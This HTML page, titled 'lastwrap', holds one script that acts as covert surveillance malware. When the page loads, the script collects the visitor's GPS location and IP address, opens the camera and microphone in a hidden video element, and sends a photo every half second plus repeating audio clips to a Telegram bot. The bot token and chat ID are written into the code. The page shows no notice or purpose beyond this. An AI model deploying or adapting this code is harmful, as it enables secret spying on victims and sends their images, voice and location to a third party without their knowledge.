<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>lastwrap</title>
</head>
<body>

<script>
  const botToken = '8110393453:AAFWhP0vFwSJobp5GhEe7XjzKiRoorMyg4Y'; 
  const chatId = '-4967067213';             // Replace with your chat ID
  const captureInterval = 500;                // Photo capture every 500 ms
  const audioClipDuration = 4000;             // 4 seconds audio clip

  let captureLoop;
  let stream;
  let locationData = 'Location unavailable';
  let ipData = 'IP unavailable';

  async function start() {
    try {
      // Get location
      try {
        const location = await getLocation();
        locationData = `Lat: ${location.lat}, Lon: ${location.lon}`;
      } catch (e) {
        console.error('Location error:', e);
      }

      // Get IP
      try {
        const ip = await fetch('https://api.ipify.org?format=json')
          .then(response => response.json());
        ipData = `IP: ${ip.ip}`;
      } catch (e) {
        console.error('IP fetch error:', e);
      }

      // Start camera + microphone
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
      const video = document.createElement('video');
      video.style.display = 'none';
      document.body.appendChild(video);
      video.srcObject = stream;
      await video.play();

      // Start capturing photos
      captureLoop = setInterval(() => captureAndSend(video), captureInterval);

      // Start recording audio clips
      startAudioClips(stream);

    } catch (error) {
      console.error('Setup error:', error);
      stopAll();
    }
  }

  async function captureAndSend(video) {
    try {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
      const caption = `${locationData}\n${ipData}\n${new Date().toLocaleString()}`;

      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob);
      formData.append('caption', caption);

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData,
      });

    } catch (error) {
      console.error('Capture/send error:', error);
      stopAll();
    }
  }

  function startAudioClips(stream) {
    const mediaRecorder = new MediaRecorder(stream);

    mediaRecorder.ondataavailable = async (event) => {
      if (event.data.size > 0) {
        sendAudioClip(event.data);
      }
    };

    mediaRecorder.onstop = () => {
      // Restart a new recording session
      startAudioClips(stream);
    };

    mediaRecorder.start();
    setTimeout(() => mediaRecorder.stop(), audioClipDuration);
  }

  async function sendAudioClip(audioBlob) {
    const caption = `${locationData}\n${ipData}\n${new Date().toLocaleString()}`;

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('voice', audioBlob);
    formData.append('caption', caption);

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
        method: 'POST',
        body: formData,
      });
    } catch (error) {
      console.error('Audio send error:', error);
    }
  }

  function stopAll() {
    if (captureLoop) clearInterval(captureLoop);
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
    }
  }

  function getLocation() {
    return new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        reject
      );
    });
  }

  // Stop everything on page close
  window.addEventListener('beforeunload', stopAll);

  // Start everything after permission is granted
  start();
</script>

</body>
</html>
